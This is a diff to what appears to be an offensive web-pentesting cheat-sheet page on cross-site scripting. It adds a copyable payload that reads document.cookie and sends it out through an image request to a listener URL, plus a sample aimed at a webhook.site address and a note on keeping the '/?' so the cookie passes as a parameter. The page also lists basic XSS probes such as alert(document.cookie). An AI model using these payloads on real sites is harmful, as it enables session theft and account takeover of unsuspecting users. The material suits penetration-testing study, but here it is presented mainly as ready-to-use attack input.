@@ -41,7 +41,15 @@
 <button onclick="document.location='/machete/offensive/web_penetration_testing/client_side_attacks.html'" class="round" style="float: left;">&lt;&lt;</button><br><br>
 <details>
 <summary>GENERAL TECHNIQUES</summary>
-	
+
+<b>C1: </b><mark id="GT01">&lt;script&gt;var i-new Image;i.src="LISTENER URL/?"+document.cookie;&lt;/script&gt;</mark>
+
+<b>SAMPLE: </b><mark>&lt;script&gt;var i-new Image;i.src="https://webhook.site/#!/d88f22e7-9e44-47e8-9508-edeb3406d1cd/?"+document.cookie;&lt;/script&gt;</mark>
+
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#GT01')">.C1.</button>
+
+<b>NOTE: </b> Do not remove the /? symbols, they allow to use the "document.cookie" as parameter. 
+
 </details>	
 <details>
 <summary>REFLECTED TECHNIQUES</summary>
@@ -49,7 +57,7 @@
 information, stole information, etc. </p>
 <p><b>COMMON TESTS:</b>
 
-<b>C1: </b><mark  id="RTA01">&lt;h1&gt;TEST&lt;/h1&gt;</mark>	
+<b>C1: </b><mark id="RTA01">&lt;h1&gt;TEST&lt;/h1&gt;</mark>	
 <b>C2: </b><mark id="RTA02">&lt;script&gt;alert('XSS');&lt;/script&gt;</mark> || C1 & C2, NORMAL TEST TO KNOW IF VULNERABILITY EXIST	
 
 <b>C3: </b><mark id="RTA03">&lt;script&gt;alert(document.cookie);&lt;/script&gt;</mark> || NORMAL TEST TO RETRIEVE COOKIES
